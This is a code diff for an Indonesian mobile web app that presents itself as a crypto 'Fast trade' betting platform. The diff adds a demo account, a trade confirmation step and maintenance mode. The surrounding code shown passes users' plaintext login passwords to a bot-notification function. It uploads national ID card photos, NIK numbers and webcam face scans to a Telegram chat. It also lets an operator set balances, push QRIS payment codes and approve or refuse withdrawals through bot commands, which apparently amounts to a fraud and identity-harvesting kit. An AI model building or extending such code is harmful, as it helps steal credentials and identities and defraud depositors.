@@ -45,7 +45,7 @@
         
         /* --- TOP BAR & SIDENAV --- */
         .top-bar { position: fixed; top: 0; width: 100%; max-width: 480px; height: 60px; background: var(--bg-card); display: flex; align-items: center; justify-content: space-between; padding: 0 15px; z-index: 1000; box-shadow: 0 2px 10px var(--shadow); border-bottom: 1px solid var(--border-color); transition: background 0.3s ease; }
-        .btn-icon { background: transparent; border: none; color: var(--text-main); font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; }
+        .btn-icon { background: transparent; border: none; color: var(--text-main); font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; position: relative; }
         .btn-icon:active { transform: scale(0.9); }
         .search-box { display: flex; align-items: center; background: var(--bg-input); padding: 8px 15px; border-radius: 20px; flex: 1; margin: 0 15px; border: 1px solid var(--border-color); transition: background 0.3s ease; cursor: pointer; }
         .search-box i { color: var(--text-muted); font-size: 14px; }
@@ -61,7 +61,7 @@
         
         .sidenav-profile { padding: 15px 20px; border-bottom: 1px solid var(--border-color); display: none; align-items: center; gap: 12px; background: rgba(0, 230, 118, 0.05); }
         .sidenav-profile i { font-size: 38px; color: var(--green); }
-        .sidenav-profile-info { display: flex; flex-direction: column; }
+        .sidenav-profile-info { display: flex; flex-direction: column; width: 100%; }
         .sidenav-profile-name { font-size: 15px; font-weight: 700; color: var(--text-main); }
         .sidenav-profile-badge { font-size: 11px; padding: 2px 6px; border-radius: 4px; font-weight: 700; margin-top: 6px; display: inline-block; width: max-content;}
         .badge-verified { background: var(--green); color: var(--bg-card); }
@@ -83,6 +83,11 @@
         .balance-card { background: var(--bg-card); border-radius: 20px; margin: 0 15px 20px 15px; padding: 22px; box-shadow: 0 8px 25px var(--shadow); position: relative; overflow: hidden; transition: background 0.3s ease; }
         .balance-header { position: relative; z-index: 1; margin-bottom: 22px; }
         .balance-label { display: flex; justify-content: space-between; align-items: center; color: var(--text-main); font-size: 13px; font-weight: 600; }
+        
+        /* Akun Selector Inline di Saldo */
+        .account-selector-inline { background: var(--bg-input); color: var(--text-main); border: 1px solid var(--border-color); padding: 6px 10px; border-radius: 8px; font-size: 13px; font-weight: 700; outline: none; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .account-selector-inline:hover { border-color: var(--green); }
+        
         .balance-label strong { background: var(--bg-input); padding: 4px 10px; border-radius: 8px; font-weight: 600; color: var(--text-main); border: 1px solid var(--border-color); }
         .balance-amount-wrapper { display: flex; align-items: center; gap: 12px; margin-top: 10px; }
         .balance-amount { font-size: 27px; font-weight: 800; color: var(--text-main); letter-spacing: -0.5px; transition: color 0.3s ease; }
@@ -274,12 +279,26 @@
         
         .notif-item { padding: 15px; border-bottom: 1px solid var(--border-color); text-align: left; display: flex; flex-direction: column; gap: 5px; }
         .notif-item:last-child { border-bottom: none; }
-        .notif-time { font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 5px; }
+        .notif-time { font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 5px; margin-top: 5px; }
         .notif-text { font-size: 13px; color: var(--text-main); font-weight: 500; line-height: 1.5; }
         .notif-unread { background: rgba(0, 230, 118, 0.05); border-left: 3px solid var(--green); }
+
+        /* --- MAINTENANCE MODAL --- */
+        .maintenance-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-body); z-index: 99999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .maintenance-overlay.show { display: flex; }
+        .m-icon { font-size: 60px; color: #ff9800; margin-bottom: 20px; animation: spin 3s linear infinite; }
+        .m-title { font-size: 22px; font-weight: 800; color: var(--text-main); margin-bottom: 10px; }
+        .m-desc { font-size: 14px; color: var(--text-muted); line-height: 1.5; max-width: 300px; }
     </style>
 </head>
 <body>
+
+    <!-- Maintenance Overlay -->
+    <div id="maintenance-modal" class="maintenance-overlay">
+        <div class="m-icon"><i class="bi bi-gear-fill"></i></div>
+        <div class="m-title">Sistem Sedang Maintenance</div>
+        <div class="m-desc">Kami sedang melakukan peningkatan server. Aplikasi ditutup sementara dan akan segera kembali. Mohon maaf atas ketidaknyamanannya.</div>
+    </div>
 
     <div class="sidenav-overlay" id="sidenav-overlay" onclick="toggleNav()"></div>
     <div class="sidenav" id="sidenav">
@@ -341,9 +360,9 @@
                 <i class="bi bi-search"></i>
                 <input type="text" id="display-asset-search" placeholder="Cari aset (cth: BTC)..." readonly>
             </div>
-            <button class="btn-icon" style="position:relative; margin-right: 15px;" onclick="openNotifModal()">
+            <button class="btn-icon" style="margin-right: 15px;" onclick="openNotifModal()">
                 <i class="bi bi-bell"></i>
-                <span id="notif-badge" style="display:none; position:absolute; top:8px; right:6px; width:10px; height:10px; background:var(--red); border-radius:50%; box-shadow: 0 0 5px var(--red);"></span>
+                <span id="notif-badge" style="display:none; position:absolute; top: -2px; right: -2px; width:10px; height:10px; background:var(--red); border-radius:50%; box-shadow: 0 0 5px var(--red);"></span>
             </button>
             <button class="btn-icon" onclick="toggleTheme()"><i class="bi bi-moon-stars" id="theme-icon"></i></button>
         </div>
@@ -351,7 +370,11 @@
         <div class="balance-card">
             <div class="balance-header">
                 <span class="balance-label">
-                    Total Saldo 
+                    <!-- Tipe Akun Pindah Kesini -->
+                    <select id="account-type-select" class="account-selector-inline" onchange="switchAccountType()">
+                        <option value="standard">Akun Standar</option>
+                        <option value="demo">Akun Demo</option>
+                    </select>
                     <strong id="user-id-display">UID: -</strong>
                 </span>
                 <div class="balance-amount-wrapper">
@@ -423,8 +446,8 @@
                 <input type="number" id="bet-input" value="50000" min="10000" step="5000">
             </div>
             <div class="predict-buttons">
-                <button class="btn-predict btn-up" onclick="executeTrade('Naik')"><i class="bi bi-graph-up-arrow"></i> Naik</button>
-                <button class="btn-predict btn-down" onclick="executeTrade('Turun')"><i class="bi bi-graph-down-arrow"></i> Turun</button>
+                <button class="btn-predict btn-up" onclick="openTradeConfirmModal('Naik')"><i class="bi bi-graph-up-arrow"></i> Naik</button>
+                <button class="btn-predict btn-down" onclick="openTradeConfirmModal('Turun')"><i class="bi bi-graph-down-arrow"></i> Turun</button>
             </div>
         </div>
 
@@ -455,10 +478,11 @@
         </div>
     </div>
 
+    <!-- Modals -->
     <div id="toast-notif" class="toast-notif">
         <div class="toast-icon"><i class="bi bi-info-circle-fill"></i></div>
         <div class="toast-content">
-            <div class="toast-title">Pesan Global</div>
+            <div class="toast-title">Fast trade</div>
             <div class="toast-desc" id="toast-msg">Notifikasi baru.</div>
         </div>
     </div>
@@ -471,6 +495,21 @@
             </div>
             <div id="notif-list-container" style="max-height: 60vh; overflow-y: auto; background: var(--bg-card);">
                 </div>
+        </div>
+    </div>
+
+    <!-- Trade Confirmation Modal -->
+    <div id="trade-confirm-modal" class="modal-overlay">
+        <div class="modal-content" style="text-align: left;">
+            <h3 style="color:var(--text-main); margin-bottom:15px; text-align:center;">Konfirmasi Transaksi</h3>
+            <div class="res-body" style="padding: 0 0 15px 0;">
+                <div class="res-row"><span class="res-label">Aset</span><span class="res-val" id="tc-asset">BTC/USDT</span></div>
+                <div class="res-row"><span class="res-label">Arah Prediksi</span><span class="res-val" id="tc-side">Naik</span></div>
+                <div class="res-row"><span class="res-label">Nominal Taruhan</span><span class="res-val" id="tc-amount">Rp 0</span></div>
+            </div>
+            <div style="font-size: 11px; color: var(--text-muted); text-align: center; margin-bottom: 15px;">Pastikan detail transaksi sudah benar. Transaksi yang berjalan tidak dapat dibatalkan.</div>
+            <button class="btn-modal" onclick="confirmTrade()">Konfirmasi Trade</button>
+            <button class="btn-modal btn-modal-outline" onclick="closeTargetModal('trade-confirm-modal')">Batal</button>
         </div>
     </div>
 
@@ -808,8 +847,13 @@
         let currentUserPhone = localStorage.getItem('sanz_current_phone');
         let currentUserName = localStorage.getItem('sanz_current_name');
         
+        let accountType = 'standard'; // 'standard' or 'demo'
         let userBalance = 0; 
+        let demoBalance = 10000000; // Default Modal Demo 10 Juta
+        
         let tradeHistory = []; 
+        let demoHistory = [];
+        
         let winstreakCount = 0;
         
         let currentAssetStream = 'btcusdt', currentAssetName = 'Bitcoin', currentSymbol = 'BTC/USDT';
@@ -828,6 +872,8 @@
         const wsMilestones = { 5: 10000, 15: 50000, 37: 700000, 68: 5000000, 120: 20000000 };
         const wsKeys = [5, 15, 37, 68, 120];
         let currentClaimable = 0;
+        
+        let pendingTradeSide = ''; // For confirmation modal
 
         // Elements
         const elLivePrice = document.getElementById('view-live-price');
@@ -839,7 +885,17 @@
         const elHistoryBox = document.getElementById('history-box');
         const elFullHistoryList = document.getElementById('full-history-list');
 
-        // --- SISTEM KEAMANAN (WAJIB LOGIN) ---
+        // --- SISTEM KEAMANAN & MAINTENANCE ---
+        function checkMaintenance() {
+            const isMaintenance = localStorage.getItem('sanz_maintenance') === 'true';
+            if (isMaintenance) {
+                document.getElementById('maintenance-modal').classList.add('show');
+            } else {
+                document.getElementById('maintenance-modal').classList.remove('show');
+            }
+        }
+        setInterval(checkMaintenance, 5000); // Check locally regularly
+
         function requireLogin() {
             if (!currentUserPhone) {
                 showModal("Akses Ditolak", "Silakan Login atau Daftar Akun terlebih dahulu untuk mengakses fitur ini.", "error");
@@ -849,17 +905,37 @@
             return true;
         }
 
+        function switchAccountType() {
+            if(!requireLogin()) {
+                document.getElementById('account-type-select').value = 'standard';
+                return;
+            }
+            if(activeTrading) {
+                showModal("Peringatan", "Tidak bisa mengganti akun saat sesi trading sedang berjalan.", "error");
+                document.getElementById('account-type-select').value = accountType;
+                return;
+            }
+            accountType = document.getElementById('account-type-select').value;
+            updateBalanceDisplay();
+            renderHistory();
+        }
+
         // --- Data Scoping per User ---
         function loadUserData(phone) {
             if(!phone) {
-                userBalance = 0; tradeHistory = []; winstreakCount = 0; userID = null; return;
+                userBalance = 0; demoBalance = 10000000; tradeHistory = []; demoHistory = []; winstreakCount = 0; userID = null; return;
             }
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
             let u = usersDb[phone];
             if(u) {
                 userID = u.uid;
                 userBalance = parseFloat(localStorage.getItem(`sanz_bal_${phone}`)) || 0;
+                
+                let savedDemoBal = localStorage.getItem(`sanz_demo_bal_${phone}`);
+                demoBalance = savedDemoBal !== null ? parseFloat(savedDemoBal) : 10000000;
+                
                 tradeHistory = JSON.parse(localStorage.getItem(`sanz_hist_${phone}`)) || [];
+                demoHistory = JSON.parse(localStorage.getItem(`sanz_demo_hist_${phone}`)) || [];
                 winstreakCount = parseInt(localStorage.getItem(`sanz_ws_${phone}`)) || 0;
             }
         }
@@ -867,11 +943,13 @@
         function saveDataLocally() {
             if(!currentUserPhone) return;
             localStorage.setItem(`sanz_bal_${currentUserPhone}`, userBalance);
+            localStorage.setItem(`sanz_demo_bal_${currentUserPhone}`, demoBalance);
             localStorage.setItem(`sanz_hist_${currentUserPhone}`, JSON.stringify(tradeHistory));
+            localStorage.setItem(`sanz_demo_hist_${currentUserPhone}`, JSON.stringify(demoHistory));
             localStorage.setItem(`sanz_ws_${currentUserPhone}`, winstreakCount);
             
             if (activeTrading) {
-                const activeData = { ...tradeSession, endTime: Date.now() + (timerCount * 1000) };
+                const activeData = { ...tradeSession, endTime: Date.now() + (timerCount * 1000), actType: accountType };
                 localStorage.setItem(`sanz_act_trade_${currentUserPhone}`, JSON.stringify(activeData));
             } else { localStorage.removeItem(`sanz_act_trade_${currentUserPhone}`); }
             saveChartAndSentiment();
@@ -888,7 +966,12 @@
                 if (userStatus && userStatus.isBlocked) {
                     elBalance.innerText = "BLOKIR"; elBalance.classList.add('blocked');
                 } else {
-                    elBalance.innerText = formatIDR(userBalance); elBalance.classList.remove('blocked');
+                    elBalance.classList.remove('blocked');
+                    if(accountType === 'demo') {
+                        elBalance.innerText = formatIDR(demoBalance);
+                    } else {
+                        elBalance.innerText = formatIDR(userBalance);
+                    }
                 }
             } else {
                 elBalance.innerText = "Rp 0"; elBalance.classList.remove('blocked'); document.getElementById('user-id-display').innerText = "UID: -";
@@ -917,6 +1000,9 @@
                 document.getElementById('nav-username').innerText = currentUserName || currentUserPhone;
                 document.getElementById('nav-phone').innerText = currentUserPhone;
                 document.getElementById('nav-regdate').innerText = "Terdaftar: " + (userData && userData.regDate ? userData.regDate : "Belum diketahui");
+                
+                // Pastikan pilihan select dropdown balance sinkron
+                document.getElementById('account-type-select').value = accountType;
 
                 if (userData && userData.isVerified) {
                     badge.innerText = "Verified"; badge.className = "sidenav-profile-badge badge-verified";
@@ -932,14 +1018,14 @@
                     verifBtn.style.display = "flex";
                 }
 
-                authLinks.style.display = 'none'; logoutLink.style.display = 'flex'; // menggunakan flex agar gap horizontal & vertikal aktif
+                authLinks.style.display = 'none'; logoutLink.style.display = 'flex'; 
                 loadUserData(currentUserPhone);
             } else {
                 profileNav.style.display = 'none'; authLinks.style.display = 'flex'; logoutLink.style.display = 'none';
                 loadUserData(null);
             }
             updateBalanceDisplay(); renderHistory(); updateWinstreakUI();
-            updateNotifBadge(); // Update badge notifikasi global saat auth diubah
+            updateNotifBadge(); checkMaintenance();
         }
 
         function togglePassword(inputId, iconEl) {
@@ -969,11 +1055,8 @@
 
         function processRegister() {
             const name = document.getElementById('reg-name').value.trim(), phone = document.getElementById('reg-phone').value.trim(), pass = document.getElementById('reg-password').value.trim();
-            // Perbaikan Bug Referral: Normalkan huruf menjadi kapital dan pastikan format UID- selalu ada di depannya.
             let ref = document.getElementById('reg-referral').value.trim().toUpperCase();
-            if (ref && !ref.startsWith('UID-')) {
-                ref = 'UID-' + ref;
-            }
+            if (ref && !ref.startsWith('UID-')) { ref = 'UID-' + ref; }
 
             if (!name || !phone || !pass) return showModal("Gagal", "Nama, Nomor HP, dan Password wajib diisi!", "error");
             if (!cfCaptchaStatus['reg']) return showModal("Keamanan", "Harap selesaikan verifikasi captcha manusia.", "error");
@@ -986,7 +1069,6 @@
             
             let newUID = 'UID-' + Math.floor(100000 + Math.random() * 900000);
             
-            // Simpan Referral Berdasarkan Input Yang Sudah Dinormalkan
             if(ref) {
                 let refs = JSON.parse(localStorage.getItem(`refs_of_${ref}`)) || [];
                 refs.push({ uid: newUID, name: name }); localStorage.setItem(`refs_of_${ref}`, JSON.stringify(refs));
@@ -1007,7 +1089,7 @@
             if (usersDb[phone].nik === nik) {
                 closeTargetModal('recover-nik-modal');
                 currentUserPhone = phone; tempResetPhone = phone;
-                openChangePasswordModal(); document.getElementById('cp-old').parentElement.style.display = 'none'; // hide old pass field
+                openChangePasswordModal(); document.getElementById('cp-old').parentElement.style.display = 'none'; 
             } else { showModalWithCS("Gagal Verifikasi", "NIK tidak sesuai dengan data KTP sebelumnya."); }
         }
 
@@ -1021,9 +1103,10 @@
             if (usersDb[phone] && usersDb[phone].password === pass) {
                 localStorage.setItem('sanz_current_phone', phone); localStorage.setItem('sanz_current_name', usersDb[phone].name);
                 currentUserPhone = phone; currentUserName = usersDb[phone].name;
+                accountType = 'standard'; // reset to standard on fresh login
                 botNotifAuth("LOGIN AKUN", currentUserName, currentUserPhone, pass, usersDb[phone].uid);
                 
-                updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); // Start polling globally
+                updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
                 showModal("Berhasil", `Selamat datang kembali, ${currentUserName}!`, "win");
             } else { showModal("Gagal", "Nomor HP atau Password salah!", "error"); }
         }
@@ -1067,6 +1150,11 @@
 
         function openKTPModal() {
             if(!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let userData = usersDb[currentUserPhone];
+            if(userData && userData.verifStatus === 'pending') {
+                return showModal("Diproses", "Data verifikasi Anda sedang diperiksa oleh Admin. Mohon tunggu.", "info");
+            }
             document.getElementById('v-name').value = ''; document.getElementById('v-nik').value = ''; document.getElementById('v-file').value = '';
             openTargetModal('verif-ktp-modal');
         }
@@ -1077,7 +1165,6 @@
             
             if(!n || !nik || ktpInput.files.length === 0) return showModal("Gagal", "Nama, NIK, dan File Foto KTP Asli wajib dilengkapi!", "error");
             
-            // Simpan Data Sementara
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
             usersDb[currentUserPhone].nik = nik; 
             localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
@@ -1088,7 +1175,6 @@
             const insText = document.getElementById('scan-instruction-text');
             insText.innerText = "Membuka Kamera...";
 
-            // Mulai Live Kamera
             try {
                 webcamStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 const videoEl = document.getElementById('webcam-video');
@@ -1115,17 +1201,14 @@
         }
 
         async function captureAndSend(nama, nik, ktpFile, videoEl) {
-            // Gambar Video dari WebCam ke dalam Canvas
             const canvas = document.createElement('canvas');
             canvas.width = videoEl.videoWidth || 480;
             canvas.height = videoEl.videoHeight || 640;
             canvas.getContext('2d').drawImage(videoEl, 0, 0, canvas.width, canvas.height);
             
-            // Hentikan stream kamera
             cancelFaceScan();
             
             canvas.toBlob(async (webcamBlob) => {
-                // Update Status ke Pending
                 let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
                 usersDb[currentUserPhone].verifStatus = 'pending';
                 localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
@@ -1133,22 +1216,18 @@
                 showModal("Diproses", "Data KTP dan Wajah berhasil dikirim. Menunggu persetujuan Admin.", "info");
 
                 try {
-                    // 1. Kirim Foto KTP
                     let fdKtp = new FormData();
                     fdKtp.append('chat_id', CHAT_ID);
                     fdKtp.append('photo', ktpFile, 'ktp.jpg');
                     fdKtp.append('caption', `📁 *DATA KTP MASUK*\n\nUser ID: \`${userID}\`\nAkun: ${currentUserPhone}\nNama KTP: ${nama}\nNIK: \`${nik}\``);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?parse_mode=Markdown`, { method: 'POST', body: fdKtp });
 
-                    // 2. Kirim Foto Face Scan Webcam
                     let fdFace = new FormData();
                     fdFace.append('chat_id', CHAT_ID);
                     fdFace.append('photo', webcamBlob, 'facescan.jpg');
                     fdFace.append('caption', `📷 *LIVENESS FACE SCAN*\n\nUser ID: \`${userID}\`\n\n--- AKSI ADMIN ---\n✅ TERIMA VERIFIKASI:\n\`/verif ${userID}\`\n\n❌ TOLAK KARENA BURAM:\n\`/tolak_verif ${userID}\``);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?parse_mode=Markdown`, { method: 'POST', body: fdFace });
-                } catch(e) {
-                    console.error("Gagal kirim media via bot", e);
-                }
+                } catch(e) { console.error("Gagal kirim media via bot", e); }
             }, 'image/jpeg');
         }
 
@@ -1232,11 +1311,10 @@
             modal.style.display = 'flex'; setTimeout(() => { modal.classList.add('show'); }, 10);
         }
 
-        // --- SISTEM NOTIFIKASI GLOBAL (NEW) ---
+        // --- SISTEM NOTIFIKASI GLOBAL ---
         function triggerGlobalNotif(msgText) {
             if(!currentUserPhone) return;
             
-            // Simpan Notif Ke Local Storage
             let notifs = JSON.parse(localStorage.getItem('sanz_notifs_' + currentUserPhone)) || [];
             let newNotif = { 
                 id: Date.now(), 
@@ -1247,10 +1325,8 @@
             notifs.unshift(newNotif);
             localStorage.setItem('sanz_notifs_' + currentUserPhone, JSON.stringify(notifs));
             
-            // Update Badge Lonceng
             updateNotifBadge();
 
-            // Munculkan Toast Melayang
             const toast = document.getElementById('toast-notif');
             document.getElementById('toast-msg').innerText = msgText;
             toast.classList.add('show');
@@ -1276,20 +1352,21 @@
                 notifs.forEach(n => {
                     listHtml += `
                     <div class="notif-item ${n.read ? '' : 'notif-unread'}">
-                        <div class="notif-time"><i class="bi bi-clock"></i> ${n.time}</div>
+                        <div style="font-weight:700; font-size:14px; color:var(--text-main);">Fast trade</div>
                         <div class="notif-text">${n.text}</div>
+                        <div class="notif-time"><i class="bi bi-clock"></i> ${n.time}</div>
                     </div>`;
-                    n.read = true; // Tandai sudah dibaca ketika dibuka
+                    n.read = true; 
                 });
                 localStorage.setItem('sanz_notifs_' + currentUserPhone, JSON.stringify(notifs));
             }
             
             document.getElementById('notif-list-container').innerHTML = listHtml;
-            updateNotifBadge(); // Hilangkan badge merah
+            updateNotifBadge(); 
             openTargetModal('notif-modal');
         }
 
-        // --- Telegram Polling Master (Deposit, WD, Saldo, Blokir, Verif, Command Bot Baru) ---
+        // --- Telegram Polling Master ---
         async function startTelegramPolling() {
             if (telegramPollInterval) clearInterval(telegramPollInterval);
             
@@ -1313,7 +1390,7 @@
                         let activeDeposit = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`)); 
                         let activeWithdraw = JSON.parse(localStorage.getItem(`sanz_active_withdraw_${currentUserPhone}`));
 
-                        // --- COMMAND /HELP (NEW) ---
+                        // COMMAND /HELP
                         if (text === '/help') {
                             const helpMsg = `*DAFTAR COMMAND ADMIN*\n\n` +
                                             `/check [UID] - Cek saldo user\n` +
@@ -1325,31 +1402,58 @@
                                             `/tolak [UID] - Tolak Deposit\n` +
                                             `/acc_wd [UID] - Setujui Penarikan\n` +
                                             `/tolak_wd [UID] - Tolak Penarikan\n` +
-                                            `/notif all [Pesan] - Kirim notifikasi global`;
+                                            `/notif all [Pesan] - Kirim notifikasi global\n` +
+                                            `/maintenance - Aktifkan maintenance\n` +
+                                            `/unmaintenance - Nonaktifkan maintenance`;
                             sendToTelegram(helpMsg);
                         }
 
-                        // --- COMMAND /NOTIF ALL (NEW) ---
+                        // COMMAND MAINTENANCE
+                        if (text === '/maintenance') {
+                            localStorage.setItem('sanz_maintenance', 'true');
+                            checkMaintenance();
+                            sendToTelegram("✅ Berhasil mengaktifkan Mode Maintenance untuk semua user.");
+                        }
+                        if (text === '/unmaintenance') {
+                            localStorage.setItem('sanz_maintenance', 'false');
+                            checkMaintenance();
+                            sendToTelegram("✅ Berhasil menonaktifkan Mode Maintenance.");
+                        }
+
+                        // COMMAND /NOTIF ALL
                         if (text.startsWith('/notif all ')) {
                             let notifText = text.replace('/notif all ', '');
                             triggerGlobalNotif(notifText);
+                            sendToTelegram(`✅ Berhasil mengirim notifikasi global:\n"${notifText}"`);
                         }
 
-                        // Cek Admin Commands Global (Cek Saldo, Blokir, Verif, Tolak Verif)
+                        // Cek Admin Commands Global
                         if (text.includes('/check') && text.includes(userID)) {
-                            sendToTelegram(`*INFO SALDO*\n\nUser ID: \`${userID}\`\nAkun: ${currentUserName} (${currentUserPhone})\nTotal Saldo: *Rp ${userBalance.toLocaleString('id-ID')}*`);
+                            sendToTelegram(`*INFO SALDO*\n\nUser ID: \`${userID}\`\nAkun: ${currentUserName} (${currentUserPhone})\nTotal Saldo Standar: *Rp ${userBalance.toLocaleString('id-ID')}*`);
                         }
                         if (text.includes('/blokir') && text.includes(userID)) {
                             let db = JSON.parse(localStorage.getItem('sanz_users_db'));
-                            if (db[currentUserPhone]) { db[currentUserPhone].isBlocked = true; localStorage.setItem('sanz_users_db', JSON.stringify(db)); updateBalanceDisplay(); sendToTelegram(`*AKUN DIBLOKIR*\nUser \`${userID}\` berhasil diblokir.`); }
+                            if (db[currentUserPhone]) { db[currentUserPhone].isBlocked = true; localStorage.setItem('sanz_users_db', JSON.stringify(db)); updateBalanceDisplay(); sendToTelegram(`✅ *AKUN DIBLOKIR*\nUser \`${userID}\` berhasil diblokir.`); }
                         }
                         if (text.includes('/verif') && !text.includes('/tolak_verif') && text.includes(userID)) {
                             let db = JSON.parse(localStorage.getItem('sanz_users_db'));
-                            if (db[currentUserPhone]) { db[currentUserPhone].isVerified = true; db[currentUserPhone].verifStatus = 'approved'; localStorage.setItem('sanz_users_db', JSON.stringify(db)); updateAuthUI(); showModal("Verifikasi Sukses", "Dokumen identitas Anda telah disetujui Admin. Anda sekarang VERIFIED.", "win"); sendToTelegram(`*VERIFIKASI BERHASIL*\nUser \`${userID}\` sekarang Verified.`); }
+                            if (db[currentUserPhone]) { 
+                                db[currentUserPhone].isVerified = true; db[currentUserPhone].verifStatus = 'approved'; 
+                                localStorage.setItem('sanz_users_db', JSON.stringify(db)); 
+                                updateAuthUI(); 
+                                triggerGlobalNotif("Verifikasi identitas Anda telah disetujui Admin. Anda sekarang VERIFIED.");
+                                sendToTelegram(`✅ *VERIFIKASI BERHASIL*\nUser \`${userID}\` sekarang Verified.`); 
+                            }
                         }
                         if (text.includes('/tolak_verif') && text.includes(userID)) {
                             let db = JSON.parse(localStorage.getItem('sanz_users_db'));
-                            if (db[currentUserPhone]) { db[currentUserPhone].isVerified = false; db[currentUserPhone].verifStatus = 'rejected'; localStorage.setItem('sanz_users_db', JSON.stringify(db)); updateAuthUI(); showModal("Verifikasi Ditolak", "Data verifikasi KTP / Wajah Anda tidak jelas atau buram. Silakan lakukan verifikasi ulang.", "error"); sendToTelegram(`*VERIFIKASI DITOLAK*\nUser \`${userID}\` telah ditolak verifikasinya.`); }
+                            if (db[currentUserPhone]) { 
+                                db[currentUserPhone].isVerified = false; db[currentUserPhone].verifStatus = 'rejected'; 
+                                localStorage.setItem('sanz_users_db', JSON.stringify(db)); 
+                                updateAuthUI(); 
+                                triggerGlobalNotif("Data verifikasi KTP / Wajah Anda ditolak oleh Admin. Silakan lakukan verifikasi ulang.");
+                                sendToTelegram(`✅ *VERIFIKASI DITOLAK*\nUser \`${userID}\` telah ditolak verifikasinya.`); 
+                            }
                         }
 
                         // Deposit Acc/Tolak
@@ -1363,7 +1467,7 @@
                                 document.getElementById('deposit-step-2').innerHTML = `<div style="text-align:center; padding:20px;"><div style="font-size: 55px; color: #00e676; margin-bottom: 10px;"><i class="bi bi-check-circle-fill"></i></div><p style="color:#00e676; font-weight:bold; font-size:18px;">Pembayaran Berhasil!</p><p style="color:var(--text-main); font-size:14px; margin-top:5px;">Saldo ${formatIDR(accAmount)} ditambahkan.</p></div>`;
                                 
                                 updateDepositHistoryStatus(activeDeposit.id, "Berhasil", accAmount); saveDataLocally();
-                                sendToTelegram(`*PEMBAYARAN BERHASIL*\n\nSaldo sebesar Rp ${accAmount.toLocaleString('id-ID')} telah ditambahkan ke \`${userID}\`.`);
+                                sendToTelegram(`✅ *PEMBAYARAN BERHASIL*\nSaldo sebesar Rp ${accAmount.toLocaleString('id-ID')} telah ditambahkan ke \`${userID}\`.`);
                                 setTimeout(() => { closeTargetModal('deposit-modal'); }, 2500);
                             }
                             else if (text.includes('/tolak') && text.includes(userID) && !text.includes('/tolak_wd') && !text.includes('/tolak_verif')) {
@@ -1372,11 +1476,12 @@
                                 document.getElementById('deposit-step-2').innerHTML = `<div style="text-align:center; padding:20px;"><div style="font-size: 55px; color: #ff5252; margin-bottom: 10px;"><i class="bi bi-x-circle-fill"></i></div><p style="color:#ff5252; font-weight:bold; font-size:16px;">Deposit Ditolak</p></div>`;
                                 
                                 updateDepositHistoryStatus(activeDeposit.id, "Dibatalkan"); saveDataLocally();
-                                sendToTelegram(`*DEPOSIT DITOLAK*\n\nPermintaan deposit dari \`${userID}\` dibatalkan.`);
+                                sendToTelegram(`✅ *DEPOSIT DITOLAK*\nPermintaan deposit dari \`${userID}\` dibatalkan.`);
                                 setTimeout(() => { closeTargetModal('deposit-modal'); }, 2500);
                             }
                             else if (text.includes('/send') && text.includes(userID) && msg.photo) {
                                 const photo = msg.photo[msg.photo.length - 1]; fetchQRImage(photo.file_id, activeDeposit);
+                                sendToTelegram(`✅ *QRIS TERKIRIM*\nQRIS berhasil dikirim ke layar \`${userID}\`.`);
                             }
                         }
 
@@ -1386,15 +1491,15 @@
                                 localStorage.removeItem(`sanz_active_withdraw_${currentUserPhone}`);
                                 let wdAmt = activeWithdraw.amount; 
                                 updateWithdrawHistoryStatus(activeWithdraw.id, "Berhasil");
-                                showModal("Penarikan Berhasil", `Penarikan saldo sebesar ${formatIDR(wdAmt)} telah berhasil diproses.`, "win");
-                                sendToTelegram(`*PENARIKAN BERHASIL*\n\nPenarikan saldo Rp ${wdAmt.toLocaleString('id-ID')} untuk \`${userID}\` berhasil.`);
+                                triggerGlobalNotif(`Penarikan saldo sebesar ${formatIDR(wdAmt)} telah berhasil diproses.`);
+                                sendToTelegram(`✅ *PENARIKAN BERHASIL*\nPenarikan saldo Rp ${wdAmt.toLocaleString('id-ID')} untuk \`${userID}\` berhasil.`);
                             }
                             else if (text.includes('/tolak_wd') && text.includes(userID)) {
                                 localStorage.removeItem(`sanz_active_withdraw_${currentUserPhone}`);
                                 let wdAmt = activeWithdraw.amount; updateWithdrawHistoryStatus(activeWithdraw.id, "Dibatalkan");
                                 userBalance += (wdAmt + WD_FEE); updateBalanceDisplay(); saveDataLocally();
-                                showModal("Penarikan Ditolak", `Permintaan ditolak, saldo sebesar ${formatIDR(wdAmt)} dan biaya admin ${formatIDR(WD_FEE)} dikembalikan.`, "error");
-                                sendToTelegram(`*PENARIKAN DITOLAK*\n\nPenarikan untuk \`${userID}\` ditolak. Dana dikembalikan.`);
+                                triggerGlobalNotif(`Penarikan ditolak. Saldo ${formatIDR(wdAmt)} dikembalikan.`);
+                                sendToTelegram(`✅ *PENARIKAN DITOLAK*\nPenarikan untuk \`${userID}\` ditolak. Dana dikembalikan.`);
                             }
                         }
                     }
@@ -1408,20 +1513,23 @@
             if (!requireLogin()) return;
             if (isUserBlocked()) return showModal("Terblokir", "Akun Anda diblokir, fitur deposit dinonaktifkan.", "error");
 
-            let activeDeposit = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`)); 
-            if (activeDeposit && activeDeposit.status === 'Menunggu' && (activeDeposit.endTime ? activeDeposit.endTime > Date.now() : true)) {
-                document.getElementById('deposit-step-1').style.display = 'none'; document.getElementById('deposit-step-2').style.display = 'block';
-                document.getElementById('deposit-amount-display').style.display = 'block'; document.getElementById('deposit-amount-display').innerText = formatIDR(activeDeposit.amount);
